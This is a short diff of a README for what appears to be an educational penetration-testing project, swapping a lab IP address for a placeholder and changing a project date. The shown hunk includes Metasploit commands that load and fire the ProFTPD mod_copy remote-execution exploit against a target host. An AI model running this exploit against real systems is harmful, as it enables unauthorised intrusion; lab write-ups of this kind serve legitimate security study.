@@ -67,7 +67,7 @@ The goal was to identify, exploit, and assess password security, highlighting cr
    ```bash
    msfconsole
    use exploit/unix/ftp/proftpd_modcopy_exec
-   set RHOST 192.168.56.101
+   set RHOST 192.168.X.X
    exploit
    ```
 
@@ -95,7 +95,7 @@ The goal was to identify, exploit, and assess password security, highlighting cr
 ## ✅ Project Status
 
 - ✅ Completed  
-- 🗓️ Date: April 2025  
+- 🗓️ Date: October 2025  
 - 🔒 Confidentiality: Educational Use Only  
 
 ---
